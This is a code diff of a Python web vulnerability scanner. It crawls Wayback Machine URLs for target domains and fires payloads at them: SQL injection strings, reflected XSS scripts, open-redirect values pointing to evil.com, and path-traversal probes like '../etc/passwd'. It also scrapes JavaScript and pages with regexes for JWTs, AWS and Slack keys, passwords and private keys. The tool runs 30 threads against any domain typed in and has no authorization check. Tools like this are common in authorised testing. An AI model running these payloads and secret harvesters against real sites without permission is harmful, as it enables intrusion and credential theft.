@@ -1,315 +1,252 @@
-import requests
-import re
-import argparse
-from urllib.parse import urlparse, urlencode, urljoin, quote
+import requests, re, threading
+from urllib.parse import urlparse, urljoin, parse_qs
+from queue import Queue
 from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import time
+from tqdm import tqdm
 
-# Payloads and params
-SSRF_PARAMS = [
-    "url", "uri", "path", "continue", "data", "dest", "redirect", "next", "v", "image", "file", "link",
-    "src", "load", "page", "callback", "return", "site", "open"
-]
-
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "\"'><script>alert(1)</script>",
-    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
-    "\u003cscript\u003ealert(1)\u003c/script\u003e"
-]
-
-REDIRECT_PAYLOADS = [
-    "https://google.com",
-    "//google.com",
-    "\\google.com",
-    "/\\google.com",
-    "%2f%2fgoogle.com"
-]
-
-SQLI_PAYLOADS = [
-    "' OR '1'='1",
-    "' OR 1=1--",
-    "\" OR \"1\"=\"1",
-    "admin' --",
-    "' UNION SELECT null, version() --",
-    "' AND SLEEP(5) --",  # time-based
-    "' OR 1=1#",
-    "' OR 1=1/*",
-    "' OR 'a'='a",
-    "') OR ('1'='1--",
-    "admin' #",
-    "admin'/*"
-]
-
+# Patterns for sensitive info in JS or URLs
 SENSITIVE_PATTERNS = {
-    "JWT": r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
-    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
-    "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
-    "Slack Token": r"xox[baprs]-([0-9a-zA-Z]{10,48})",
+    "JWT Token": r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
     "API Key": r"(?i)(api[_-]?key|token|secret|access[_-]?token|auth[_-]?token)[\"'=:\s]+([a-z0-9-_]{16,})",
-    "Email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
-    "Password": r"(?i)(password|pwd|pass)[\"'=:\s]+([a-zA-Z0-9@#%$!^&*]{6,})",
-    "Private Key": r"-----BEGIN PRIVATE KEY-----[\s\S]+?-----END PRIVATE KEY-----",
+    "Password": r"(?i)password[\"'=:\s]+([^\s&\"']+)",
+    # Add more as needed
 }
 
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (VulnScannerPro/1.0)"
-}
+# Patterns for vulnerabilities
+OPEN_REDIRECT_PAYLOADS = ["http://evil.com", "https://evil.com", "//evil.com"]
+XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
+IDOR_PAYLOADS = ["../etc/passwd", "/admin", "/secret"]
 
-def get_wayback_urls(domain):
+# Thread-safe results store
+results_lock = threading.Lock()
+results = []
+
+def fetch_wayback_urls(domain):
     urls = set()
     try:
-        url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
-        r = requests.get(url, timeout=15, headers=HEADERS)
-        if r.status_code == 200:
-            data = r.json()
-            for entry in data[1:]:
-                urls.add(entry[0])
-    except Exception:
-        pass
+        # Query Wayback Machine API (archive.org)
+        api_url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey&limit=5000"
+        r = requests.get(api_url, timeout=15)
+        data = r.json()
+        for entry in data[1:]:  # skip header row
+            url = entry[0]
+            urls.add(url)
+    except Exception as e:
+        print(f"[!] Wayback fetch error: {e}")
     return list(urls)
 
-def url_exists(url):
+def scrape_js_urls(url):
+    """Fetch URL, parse HTML, find JS files, return JS URLs."""
+    js_urls = set()
     try:
-        r = requests.head(url, timeout=8, allow_redirects=True, headers=HEADERS)
-        return r.status_code == 200
+        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
+        if r.status_code == 200:
+            soup = BeautifulSoup(r.text, "html.parser")
+            # Find all <script src="">
+            for script in soup.find_all("script", src=True):
+                src = script['src']
+                full_url = urljoin(url, src)
+                js_urls.add(full_url)
     except:
-        return False
+        pass
+    return list(js_urls)
 
-def extract_forms_and_inputs(url):
-    try:
-        r = requests.get(url, timeout=10, headers=HEADERS)
-        if "text/html" not in r.headers.get("Content-Type", ""):
-            return []
-        soup = BeautifulSoup(r.text, "html.parser")
-        forms = soup.find_all("form")
-        inputs = [tag.get("name") for tag in soup.find_all("input") if tag.get("name")]
-        return [(url, form.get("action"), form.get("method", "get"), inputs) for form in forms]
-    except:
-        return []
-
-def scan_ssrf(url, blind_url):
-    findings = []
-    for param in SSRF_PARAMS:
-        try:
-            base = url.split("?")[0]
-            test_url = base + "?" + urlencode({param: blind_url})
-            r = requests.get(test_url, timeout=10, headers=HEADERS)
-            # We can't detect blindly here, rely on webhook.site manual check
-            findings.append(f"{test_url}")
-        except:
-            pass
-    return findings
-
-def scan_xss(url):
-    findings = []
-    for payload in XSS_PAYLOADS:
-        try:
-            r = requests.get(url, params={"q": payload}, timeout=10, headers=HEADERS)
-            if payload.lower() in r.text.lower():
-                findings.append(f"{url}?q={quote(payload)}")
-        except:
-            pass
-    return findings
-
-def scan_redirect(url):
-    findings = []
-    for payload in REDIRECT_PAYLOADS:
-        try:
-            r = requests.get(url, params={"next": payload}, allow_redirects=False, timeout=10, headers=HEADERS)
-            location = r.headers.get("Location", "")
-            if payload in location:
-                findings.append(f"{url}?next={quote(payload)}")
-        except:
-            pass
-    return findings
-
-def scan_sqli(url):
-    findings = []
-    for payload in SQLI_PAYLOADS:
-        try:
-            start = time.time()
-            r = requests.get(url, params={"id": payload}, timeout=15, headers=HEADERS)
-            duration = time.time() - start
-
-            # Filter status codes
-            if r.status_code not in [200, 500]:
-                continue
-
-            lower_text = r.text.lower()
-            error_indicators = ["sql", "syntax", "mysql", "error", "warning", "unterminated"]
-            # Basic error detection
-            if any(e in lower_text for e in error_indicators):
-                snippet_start = max(0, lower_text.find("error")-30)
-                snippet = r.text[snippet_start:snippet_start+150].replace('\n', ' ').strip()
-                findings.append({
-                    "url": f"{url}?id={quote(payload)}",
-                    "evidence": snippet
-                })
-            # Time-based detection: if payload contains SLEEP and response delayed >4 sec, mark it
-            elif "sleep" in payload.lower() and duration > 4:
-                findings.append({
-                    "url": f"{url}?id={quote(payload)}",
-                    "evidence": f"Response time {duration:.2f}s indicates possible blind SQLi."
-                })
-        except:
-            pass
-    return findings
-
-def scan_sensitive_info(url):
+def extract_sensitive_from_js(js_url):
+    """Download JS and scan for sensitive patterns."""
     findings = []
     try:
-        r = requests.get(url, timeout=10, headers=HEADERS)
-        for name, pattern in SENSITIVE_PATTERNS.items():
-            for match in re.findall(pattern, r.text):
-                if isinstance(match, tuple):
-                    match = match[1]
-                findings.append({
-                    "type": name,
-                    "value": match,
-                    "url": url
-                })
+        r = requests.get(js_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
+        if r.status_code == 200:
+            text = r.text
+            for name, pattern in SENSITIVE_PATTERNS.items():
+                for m in re.finditer(pattern, text):
+                    val = m.group(0)
+                    findings.append((name, val, js_url))
     except:
         pass
     return findings
 
-def scan_forms(url):
+def check_open_redirect(url):
+    """Test URL params for open redirect."""
     findings = []
-    for form_info in extract_forms_and_inputs(url):
-        base_url, action, method, inputs = form_info
-        form_url = urljoin(url, action or "")
-        data = {field: XSS_PAYLOADS[0] for field in inputs}
-        try:
-            if method.lower() == "post":
-                r = requests.post(form_url, data=data, timeout=10, headers=HEADERS)
-            else:
-                r = requests.get(form_url, params=data, timeout=10, headers=HEADERS)
-            if XSS_PAYLOADS[0].lower() in r.text.lower():
-                findings.append(form_url)
-        except:
-            pass
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    for param in params:
+        for payload in OPEN_REDIRECT_PAYLOADS:
+            test_params = params.copy()
+            test_params[param] = [payload]
+            # Rebuild test URL
+            query_string = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
+            try:
+                r = requests.get(test_url, allow_redirects=False, timeout=10)
+                if r.is_redirect or r.status_code in [301,302,303,307,308]:
+                    location = r.headers.get("Location", "")
+                    if payload in location:
+                        findings.append(("Open Redirect", test_url))
+            except:
+                pass
     return findings
 
-def scan_url(url, blind):
-    # Pre-check URL exists
-    if not url_exists(url):
-        return None
+def check_xss(url):
+    """Test URL params for reflected XSS."""
+    findings = []
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    for param in params:
+        for payload in XSS_PAYLOADS:
+            test_params = params.copy()
+            test_params[param] = [payload]
+            query_string = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
+            try:
+                r = requests.get(test_url, timeout=10)
+                if payload in r.text:
+                    findings.append(("XSS", test_url))
+            except:
+                pass
+    return findings
 
-    results = {
-        "ssrf": [],
-        "xss": [],
-        "redirect": [],
-        "sqli": [],
-        "sensitive": [],
-        "form_xss": []
-    }
+def check_idor(url):
+    """Try IDOR payloads in URL path or params."""
+    findings = []
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+    path = parsed.path
+    params = parse_qs(parsed.query)
+    # Check path manipulation
+    for payload in IDOR_PAYLOADS:
+        test_url = base_url + payload
+        try:
+            r = requests.get(test_url, timeout=10)
+            # Heuristic: HTTP 200 + some sensitive keywords
+            if r.status_code == 200 and ("password" in r.text.lower() or "secret" in r.text.lower() or "admin" in r.text.lower()):
+                findings.append(("IDOR", test_url))
+        except:
+            pass
+    # Also try param injection
+    for param in params:
+        for payload in IDOR_PAYLOADS:
+            test_params = params.copy()
+            test_params[param] = [payload]
+            query_string = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
+            test_url = f"{base_url}{path}?{query_string}"
+            try:
+                r = requests.get(test_url, timeout=10)
+                if r.status_code == 200 and ("password" in r.text.lower() or "secret" in r.text.lower()):
+                    findings.append(("IDOR", test_url))
+            except:
+                pass
+    return findings
 
-    results["ssrf"] = scan_ssrf(url, blind)
-    results["xss"] = scan_xss(url)
-    results["redirect"] = scan_redirect(url)
-    results["sqli"] = scan_sqli(url)
-    results["sensitive"] = scan_sensitive_info(url)
-    results["form_xss"] = scan_forms(url)
+def find_jwt_in_url(url):
+    """Detect JWT tokens in URL parameters."""
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    findings = []
+    for param in params:
+        for val in params[param]:
+            if val.startswith("eyJ"):  # typical JWT header start
+                findings.append(("JWT Token", url))
+    return findings
 
-    return (url, results)
+def worker(queue):
+    while True:
+        url = queue.get()
+        if url is None:
+            break
+        local_findings = []
 
-def print_findings(all_results):
-    sql_found = []
-    ssrf_found = []
-    xss_found = []
-    redirect_found = []
-    sensitive_found = []
-    form_xss_found = []
+        # Check open redirect
+        local_findings.extend(check_open_redirect(url))
 
-    for url, res in all_results:
-        if not res:
-            continue
-        if res["ssrf"]:
-            for poc in res["ssrf"]:
-                ssrf_found.append(poc)
-        if res["xss"]:
-            for poc in res["xss"]:
-                xss_found.append(poc)
-        if res["redirect"]:
-            for poc in res["redirect"]:
-                redirect_found.append(poc)
-        if res["sqli"]:
-            for sqli in res["sqli"]:
-                sql_found.append((sqli["url"], sqli["evidence"]))
-        if res["sensitive"]:
-            for sens in res["sensitive"]:
-                sensitive_found.append((sens["type"], sens["value"], sens["url"]))
-        if res["form_xss"]:
-            for f in res["form_xss"]:
-                form_xss_found.append(f)
+        # Check XSS
+        local_findings.extend(check_xss(url))
 
-    if sql_found:
-        print("\033[1;31m[+] SQL Injection Found:\033[0m")
-        for url, evidence in sql_found:
-            print(f"  - {url}\n    Evidence: {evidence}\n")
+        # Check IDOR
+        local_findings.extend(check_idor(url))
 
-    if ssrf_found:
-        print("\033[1;35m[+] Possible SSRF POCs (check webhook manually):\033[0m")
-        for poc in ssrf_found:
-            print(f"  - {poc}")
-        print()
+        # Find JWT tokens in URL
+        local_findings.extend(find_jwt_in_url(url))
 
-    if xss_found:
-        print("\033[1;33m[+] XSS Found:\033[0m")
-        for poc in xss_found:
-            print(f"  - {poc}")
-        print()
-
-    if form_xss_found:
-        print("\033[1;33m[+] Form-based XSS Found:\033[0m")
-        for poc in form_xss_found:
-            print(f"  - {poc}")
-        print()
-
-    if redirect_found:
-        print("\033[1;36m[+] Open Redirect Found:\033[0m")
-        for poc in redirect_found:
-            print(f"  - {poc}")
-        print()
-
-    if sensitive_found:
-        print("\033[1;34m[+] Sensitive Information Found:\033[0m")
-        for t, val, url in sensitive_found:
-            print(f"  - [{t}] {val} (at {url})")
-        print()
+        with results_lock:
+            for item in local_findings:
+                results.append(item)
+        queue.task_done()
 
 def main():
-    parser = argparse.ArgumentParser(description="Comprehensive Vulnerability Scanner")
-    parser.add_argument("domain", help="Domain to scan, e.g. https://example.com")
-    parser.add_argument("--blind", help="Blind SSRF webhook.site URL for SSRF detection", required=True)
-    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
-    args = parser.parse_args()
+    inp = input("Enter comma-separated URLs or a filename: ").strip()
 
-    domain = args.domain.strip().rstrip('/')
-    blind_url = args.blind
-    print(f"[+] Fetching URLs from Wayback for {domain} ...")
-    urls = get_wayback_urls(domain)
+    # Determine if input is a file
+    try:
+        with open(inp, "r") as f:
+            input_urls = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        # Not a file, treat as comma-separated input
+        input_urls = [u.strip() for u in inp.split(",") if u.strip()]
 
-    if not urls:
-        print("[!] No URLs found from Wayback. Exiting.")
-        return
+    # Normalize URLs, if domain only add https://
+    normalized_urls = []
+    for u in input_urls:
+        if not u.startswith("http://") and not u.startswith("https://"):
+            u = "https://" + u
+        normalized_urls.append(u)
 
-    print(f"[+] Found {len(urls)} URLs. Starting scan with {args.threads} threads...\n")
+    # Collect URLs from Wayback for all domains
+    all_urls = []
+    for u in normalized_urls:
+        domain = urlparse(u).netloc
+        print(f"[*] Fetching archived URLs from Wayback for domain: {domain}")
+        wayback_urls = fetch_wayback_urls(domain)
+        print(f"  Found {len(wayback_urls)} URLs from Wayback")
+        all_urls.extend(wayback_urls)
 
-    results = []
-    with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        futures = {executor.submit(scan_url, url, blind_url): url for url in urls}
-        for future in as_completed(futures):
-            url = futures[future]
-            try:
-                res = future.result()
-                if res:
-                    results.append(res)
-            except Exception as e:
-                pass
+        # Also add the original URL itself for scanning
+        all_urls.append(u)
 
-    print_findings(results)
+        # Scrape JS files from the original URL to find more URLs and sensitive info
+        js_urls = scrape_js_urls(u)
+        print(f"  Found {len(js_urls)} JS files to scan for sensitive info")
+        for js_url in js_urls:
+            js_findings = extract_sensitive_from_js(js_url)
+            with results_lock:
+                for name, val, jsurl in js_findings:
+                    results.append((f"Sensitive Info - {name}", val, jsurl))
+
+    # Remove duplicates
+    all_urls = list(set(all_urls))
+    print(f"[*] Starting scan on {len(all_urls)} URLs with 30 threads...")
+
+    # Start worker threads
+    queue = Queue()
+    threads = []
+    for _ in range(30):
+        t = threading.Thread(target=worker, args=(queue,))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+    for url in all_urls:
+        queue.put(url)
+
+    queue.join()
+
+    # Stop workers
+    for _ in range(30):
+        queue.put(None)
+    for t in threads:
+        t.join()
+
+    # Print results
+    print("\nScan Complete. Results:")
+    if results:
+        for r in results:
+            if len(r) == 3:
+                print(f"[!] {r[0]}: {r[1]} ({r[2]})")
+            else:
+                print(f"[!] {r[0]}: {r[1]}")
+    else:
+        print("No issues found.")
 
 if __name__ == "__main__":
     main()
